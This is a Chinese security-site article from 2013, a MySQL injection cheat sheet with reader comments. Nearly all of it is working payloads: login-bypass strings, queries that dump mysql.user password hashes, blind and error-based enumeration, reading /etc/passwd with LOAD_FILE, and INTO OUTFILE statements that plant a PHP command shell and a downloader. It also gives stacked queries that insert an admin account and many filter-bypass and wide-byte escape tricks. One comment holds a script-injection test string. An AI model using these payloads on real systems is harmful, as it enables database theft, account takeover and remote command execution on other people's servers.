<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">MySql注入科普</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/05/24 2:11" ui-time="" datetime="2013/05/24 2:11" class="published ng-binding ng-isolate-scope">2013/05/24 2:11</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>默认存在的数据库：</h3><table><tr><td>mysql</td><td>需要root权限读取</td></tr><tr><td>information_schema</td><td>在5以上的版本中存在</td></tr></table><h3>测试是否存在注入方法</h3><p>假：表示查询是错误的 (MySQL 报错/返回页面与原来不同)</p><p>真：表示查询是正常的 (返回页面与原来相同)</p><p>共三种情况：</p><table><tr><th>字符串类型查询时：</th><th>数字类型查询时：</th><th>登陆时：</th></tr><tr><td><table><tr><td>'</td><td>假</td></tr><tr><td>''</td><td>真</td></tr><tr><td>"</td><td>假</td></tr><tr><td>""</td><td>真</td></tr><tr><td>\</td><td>假</td></tr><tr><td>\\</td><td>真</td></tr></table></td><td><table><tr><td>AND 1</td><td>真</td></tr><tr><td>AND 0</td><td>假</td></tr><tr><td>AND true</td><td>真</td></tr><tr><td>AND false</td><td>假</td></tr><tr><td>1-false</td><td>有问题时返回1的结果</td></tr><tr><td>1-true</td><td>有问题时返回0的结果</td></tr><tr><td>2-1</td><td>返回与1相同代表可能存在问题</td></tr><tr><td>1*56</td><td>返回与56相同代表可能存在问题</td></tr><tr><td>1*56</td><td>返回与1相同代表没有问题</td></tr></table></td><td><table><tr><td>' OR '1</td></tr><tr><td>' OR 1 -- -</td></tr><tr><td>" OR "" = "</td></tr><tr><td>" OR 1 = 1 -- -</td></tr><tr><td>'='</td></tr><tr><td>'LIKE'</td></tr><tr><td>'=0--+</td></tr></table></td></tr></table><p>例子:</p><pre><code>SELECT * FROM Users WHERE id = '1''';
SELECT * FROM Users WHERE id = 3-2;
SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';
</code></pre><p>可以使用很多单双引号，只要是成对出现。</p><pre><code>SELECT * FROM Articles WHERE id = '121'''''''''''''
</code></pre><p>引号后的语句会继续执行。</p><pre><code>SELECT '1'''''"" UNION SELECT '2' # 1 and 2
</code></pre><p>下面的符号可以用来注释语句：</p><table><tr><td>#</td><td>Hash 语法</td></tr><tr><td>/*</td><td>C-style 语法</td></tr><tr><td>-- -</td><td>SQL 语法</td></tr><tr><td>;%00</td><td>空字节</td></tr><tr><td>`</td><td>反引号</td></tr></table><p>例子：</p><pre><code>SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';
</code></pre><h3>测试数据库版本</h3><pre><code>VERSION()
@@VERSION
@@GLOBAL.VERSION
</code></pre><p>如果版本为5的话，下面例子返回为真：</p><pre><code>SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';
</code></pre><p>windows平台上的mysql查询与linux上返回不同，如果是windows服务器返回结果会包含 -nt-log字符。</p><h3>数据库认证信息：</h3><table><tr><td>表</td><td>mysql.user</td></tr><tr><td>字段</td><td>user, password</td></tr><tr><td>当前用户</td><td>user(), current_user(), current_user, system_user(), session_user()</td></tr></table><p>例子：</p><pre><code>SELECT current_user;
SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)
</code></pre><h3>数据库名：</h3><table><tr><td>表</td><td>information_schema.schemata, mysql.db</td></tr><tr><td>字段</td><td>schema_name, db</td></tr><tr><td>当前数据库</td><td>database(), schema()</td></tr></table><p>例子：</p><pre><code>SELECT database();
SELECT schema_name FROM information_schema.schemata;
SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
</code></pre><h3>服务器主机名：</h3><pre><code>@@HOSTNAME
</code></pre><p>例子：</p><pre><code>SELECT @@hostname;
</code></pre><h3>表和字段</h3><h4>检测字段数</h4><p>两种方式：</p><table><tr><td>ORDER BY判断</td><td>ORDER BY n+1; 让n一直增加直到出现错误页面。 例子: 查询语句 SELECT username, password, permission FROM Users WHERE id = '1'; 1' ORDER BY 1--+ 真 1' ORDER BY 2--+ 真 1' ORDER BY 3--+ 真 1' ORDER BY 4--+ 假- 查询只用了3个字段 -1' UNION SELECT 1,2,3--+ 真</td></tr><tr><td>基于错误查询</td><td>AND (SELECT * FROM SOME_EXISTING_TABLE) = 1 注意: 这种方式需要你知道所要查询的表名。 这种报错方式返回表的字段数，而不是错误的查询语句。 例子： 查询语句 SELECT permission FROM Users WHERE id = 1; AND (SELECT * FROM Users) = 1 返回Users的字段数</td></tr></table><h4>查询表名</h4><p>三种方式：</p><table><tr><td>Union方式</td><td>UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;-- MySQL 4版本时用version=9，MySQL 5版本时用version=10</td></tr><tr><td>盲注</td><td>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'</td></tr><tr><td>报错</td><td>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- 在5.1.5版本中成功。</td></tr></table><h4>查询列名</h4><table><tr><td>Union方式</td><td>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'</td></tr><tr><td>盲注</td><td>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'</td></tr><tr><td>报错</td><td>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- 在5.1.5版本中成功。 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1版本修复了</td></tr><tr><td>利用PROCEDURE ANALYSE()</td><td>这个需要web展示页面有你所注入查询的一个字段。 例子: 查询语句 SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名</td></tr></table><h4>一次查询多个表或列</h4><pre><code>SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&amp;gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &amp;gt;',table_name,' &amp;gt; ',column_name))))x
</code></pre><p>例子：</p><pre><code>SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&amp;gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &amp;gt;',table_name,' &amp;gt; ',column_name))))x), 4--+';
</code></pre><p>输出结果：</p><pre><code> [ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME
 [ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME
 [ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION
 [ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN
 [ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME
 [ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME
 [ information_schema ] &gt;COLLATIONS &gt; ID
 [ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT
 [ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED
</code></pre><p>利用代码：</p><pre><code>SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
</code></pre><p>例子：</p><pre><code>SELECT username FROM Users WHERE id = '-1' UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns;
</code></pre><p>输出结果：</p><pre><code>Table: talk_revisions
Column: revid

Table: talk_revisions
Column: userid

Table: talk_revisions
Column: user

Table: talk_projects
Column: priority
</code></pre><h4>根据列名查询所在的表</h4><table><tr><td>SELECT table_name FROM information_schema.columns WHERE column_name = 'username';</td><td>查询字段为username的表</td></tr><tr><td>SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</td><td>查询字段中包含user的表</td></tr></table><h4>根据表查询包含的字段</h4><table><tr><td>SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';</td><td>查询user表中的字段</td></tr><tr><td>SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';</td><td>查询包含user字符串表中的字段</td></tr></table><h4>绕过引号限制</h4><table><tr><td>SELECT * FROM Users WHERE username = 0x61646D696E</td><td>Hex编码</td></tr><tr><td>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td><td>利用CHAR()函数</td></tr></table><h4>绕过字符串黑名单</h4><table><tr><td>SELECT 'a' 'd' 'mi' 'n';</td></tr><tr><td>SELECT CONCAT('a', 'd', 'm', 'i', 'n');</td></tr><tr><td>SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');</td></tr><tr><td>SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');</td></tr></table><p>使用CONCAT()时，任何个参数为null，将返回null， 推荐使用CONCAT_WS() 。</p><p>CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。</p><h4>条件语句</h4><table><tr><td>CASE</td></tr><tr><td>IF()</td></tr><tr><td>IFNULL()</td></tr><tr><td>NULLIF()</td></tr></table><p>例子：</p><pre><code>SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
</code></pre><h4>时间延迟查询：</h4><table><tr><td>SLEEP()</td><td>MySQL 5</td></tr><tr><td>BENCHMARK()</td><td>MySQL 4/5</td></tr></table><p>例子：</p><pre><code>' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
</code></pre><h3>权限</h3><h4>文件权限</h4><p>下面的语句可以查询用户读写文件操作权限：</p><table><tr><td>SELECT file_priv FROM mysql.user WHERE user = 'username';</td><td>需要root用户来执行</td><td>MySQL 4/5</td></tr><tr><td>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</td><td>普通用户都可以</td><td>MySQL 5</td></tr></table><h4>读取文件</h4><p>如果用户有文件操作权限可以读取文件：</p><pre><code>LOAD_FILE()
</code></pre><p>例子：</p><pre><code>SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
</code></pre><ul><li>文件必须在服务器上。</li><li>LOAD_FILE()函数操作文件的当前目录是@@datadir 。</li><li>MySQL用户必须拥有对此文件读取的权限。</li><li>文件大小必须小于 max_allowed_packet。</li><li>@@max_allowed_packet的默认大小是1047552 字节.</li></ul><h4>写文件</h4><p>如果用户有文件操作权限可以写文件。</p><pre><code>INTO OUTFILE/DUMPFILE
</code></pre><p>写一个php的shell：</p><pre><code>SELECT '&lt;? system($_GET[\'c\']); ?&gt;' INTO OUTFILE '/var/www/shell.php';
</code></pre><p>访问如下链接：</p><p>http://localhost/shell.php?c=cat%20/etc/passwd</p><p>写一个下载者：</p><pre><code>SELECT '&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;' INTO OUTFILE '/var/www/get.php'
</code></pre><p>访问如下链接：</p><p>http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</p><ul><li>INTO OUTFILE 不可以覆盖已存在的文件。</li><li>INTO OUTFILE 必须是最后一个查询。</li><li>引号是必须的，因为没有办法可以编码路径名。</li></ul><h4>PDO堆查询方式操作数据库</h4><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p><pre><code>SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username,password,priv) VALUES ('BobbyTables', 'kl20da$$','admin');
</code></pre><h4>MySql特有的写法</h4><p>MySql中，/*! SQL 语句 */ 这种格式里面的 SQL 语句会当正常的语句一样被解析。</p><p>如果在!之后是一串数字(这串数字就是 mysql 数据库的版本号), 如：/*! 12345 SQL 语句 */</p><p>当版本号大于等于该数字,SQL 语句则执行,否则就不执行。</p><pre><code>SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
</code></pre><h3>模糊和混淆</h3><h4>允许的字符</h4><table><tr><td>09</td><td>Horizontal Tab</td></tr><tr><td>0A</td><td>New Line</td></tr><tr><td>0B</td><td>Vertical Tab</td></tr><tr><td>0C</td><td>New Page</td></tr><tr><td>0D</td><td>Carriage Return</td></tr><tr><td>A0</td><td>Non-breaking Space</td></tr><tr><td>20</td><td>Space</td></tr></table><p>例子：</p><pre><code>'%0A%09UNION%0CSELECT%A0NULL%20%23
</code></pre><p>括号也可以用来绕过过滤空格的情况：</p><table><tr><td>28</td><td>(</td></tr><tr><td>29</td><td>)</td></tr></table><p>例子：</p><pre><code>UNION(SELECT(column)FROM(table))
</code></pre><h4>AND或OR后面可以跟的字符</h4><table><tr><td>20</td><td>Space</td></tr><tr><td>2B</td><td>+</td></tr><tr><td>2D</td><td>-</td></tr><tr><td>7E</td><td>~</td></tr><tr><td>21</td><td>!</td></tr><tr><td>40</td><td>@</td></tr></table><p>例子：</p><pre><code>SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
</code></pre><p>dual是一个虚拟表，可以用来做测试。</p><h3>几个针对黑名单绕过的例子</h3><h4>基于关键字的黑名单</h4><table><tr><td>过滤关键字</td><td>and or</td></tr><tr><td>php代码</td><td>preg_match('/(and|or)/i',$id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 or 1=1 1 and 1=1</td></tr><tr><td>绕过方式</td><td>1 || 1=1 1 && 1=1</td></tr></table><p>下面这种方式你需要已经知道一些表和字段名（可以利用substring函数去一个一个获得information_schema.columns表中的数据）</p><table><tr><td>过滤关键字</td><td>and or union</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union)/i',$id)</td></tr><tr><td>会过滤的攻击代码</td><td>union select user,password from users</td></tr><tr><td>绕过方式</td><td>1 && (select user from users where userid=1)='admin'</td></tr></table><table><tr><td>过滤关键字</td><td>and or union where</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where)/i',$id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select user from users where user_id = 1) = 'admin'</td></tr><tr><td>绕过方式</td><td>1 && (select user from users limit 1) = 'admin'</td></tr></table><table><tr><td>过滤关键字</td><td>and or union where</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where)/i',$id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select user from users where user_id = 1) = 'admin'</td></tr><tr><td>绕过方式</td><td>1 && (select user from users limit 1) = 'admin'</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select user from users limit 1) = 'admin'</td></tr><tr><td>绕过方式</td><td>1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select user from users group by user_id having user_id = 1) = 'admin'</td></tr><tr><td>绕过方式</td><td>1 && (select substr(group_concat(user_id),1,1) user from users ) = 1</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by, select</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by|select)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1</td></tr><tr><td>绕过方式</td><td>1 && substr(user,1,1) = 'a'</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by, select, '</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1</td></tr><tr><td>绕过方式</td><td>1 && user_id is not null 1 && substr(user,1,1) = 0x61 1 && substr(user,1,1) = unhex(61)</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by, select, ', hex</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && substr(user,1,1) = unhex(61)</td></tr><tr><td>绕过方式</td><td>1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by, select, ', hex, substr</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && substr(user,1,1) = lower(conv(11,10,16))/td></td></tr><tr><td>绕过方式</td><td>1 && lpad(user,7,1)</td></tr></table><table><tr><td>过滤关键字</td><td>and, or, union, where, limit, group by, select, ', hex, substr, 空格</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 && lpad(user,7,1)/td></td></tr><tr><td>绕过方式</td><td>1%0b||%0blpad(user,7,1)</td></tr><tr><td>过滤关键字</td><td>and or union where</td></tr><tr><td>php代码</td><td>preg_match('/(and|or|union|where)/i',$id)</td></tr><tr><td>会过滤的攻击代码</td><td>1 || (select user from users where user_id = 1) = 'admin'</td></tr><tr><td>绕过方式</td><td>1 || (select user from users limit 1) = 'admin'</td></tr></table><h4>利用正则表达式进行盲注</h4><p>我们都已经知道，在MYSQL 5+中 information_schema库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下：</p><p>1、判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*
</code></pre><p>2、判断第一个字符是否是a-n中的字符</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*
</code></pre><p>3、确定该字符为n</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*
</code></pre><p>4、表达式的更换如下</p><pre><code>'^n[a-z]' -&gt; '^ne[a-z]' -&gt; '^new[a-z]' -&gt; '^news[a-z]' -&gt; FALSE 
</code></pre><p>这时说明表名为news ，要验证是否是该表明 正则表达式为'^news$'，但是没这必要 直接判断 table_name = 'news' 不就行了。</p><p>5、接下来猜解其它表了 只需要修改 limit 1,1 -> limit 2,1就可以对接下来的表进行盲注了。</p><h4>order by后的注入</h4><p>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p><p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p><p>原始链接：http://www.test.com/list.php?order=vote 根据vote字段排序。</p><p>找到投票数最大的票数num然后构造以下链接：</p><pre><code>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc
</code></pre><p>看排序是否变化。</p><p>还有一种方法不需要知道任何字段信息，使用rand函数：</p><pre><code>http://www.test.com/list.php?order=rand(true)
http://www.test.com/list.php?order=rand(false)
</code></pre><p>以上两个会返回不同的排序，判断表名中第一个字符是否小于128的语句如下：</p><pre><code>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))
</code></pre><h4>宽字节注入</h4><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠(&#41;的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊啊啊啊啊</span> <span class="reply-time">2016-06-03 14:34:00</span></div><p></p><p>完全 看不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kuroneko</span> <span class="reply-time">2016-03-30 12:54:24</span></div><p></p><p>好想问宽字节怎么防御。。。如果只用函数处理不改字节编码的话。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">二愣子</span> <span class="reply-time">2015-10-21 11:15:09</span></div><p></p><p>最后order by注入中，char()函数应该换成ascii()函数吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">s3xy</span> <span class="reply-time">2015-09-16 06:33:31</span></div><p></p><p>好像最下面substring应该改成substr</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BeenQuiver</span> <span class="reply-time">2015-08-12 18:00:53</span></div><p></p><p>太好了，掉渣</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小福仔</span> <span class="reply-time">2015-07-22 14:24:21</span></div><p></p><p>太好了，够科普</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Soulmk</span> <span class="reply-time">2015-06-28 17:07:25</span></div><p></p><p>再次学习了啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路人甲</span> <span class="reply-time">2015-01-13 23:04:51</span></div><p></p><p>&#039; or 1=1</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">测试</span> <span class="reply-time">2015-01-09 14:08:21</span></div><p></p><p>&lt;script&gt;alert(&quot;脚本注入&quot;)&lt;/script&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rasca1</span> <span class="reply-time">2014-12-15 19:21:09</span></div><p></p><p>不错，够科普</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小涛</span> <span class="reply-time">2014-11-09 11:16:01</span></div><p></p><p>完全看不懂啊 能 不能 教教 我 sql 注入啊 ～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mlnotes</span> <span class="reply-time">2014-07-29 20:31:06</span></div><p></p><p>select * from user\G; 是这个吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">新一</span> <span class="reply-time">2014-07-29 20:07:33</span></div><p></p><p>先mark再学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">阿布</span> <span class="reply-time">2013-12-14 14:12:56</span></div><p></p><p>有点看不懂。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黄小昏</span> <span class="reply-time">2013-09-26 09:38:59</span></div><p></p><p>马克马克</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">l4mbda</span> <span class="reply-time">2013-08-06 10:12:11</span></div><p></p><p>http://websec.ca/kb/sql_injection 贴</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whirlwind</span> <span class="reply-time">2013-06-21 20:34:42</span></div><p></p><p>盲注就是太累，对了 请教一下 比如一次查询的内容太多，如何换行？？以前看到过 但是忘记了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-05-24 16:05:25</span></div><p></p><p>很好的bypass.<br>这里我问一个 对于：数据库细度控制设备。对于关键表比如 sys_admin 直接拦截怎么绕过。（这个可理解为中间件设备）</p><p></p></div></div></div></div></div></main>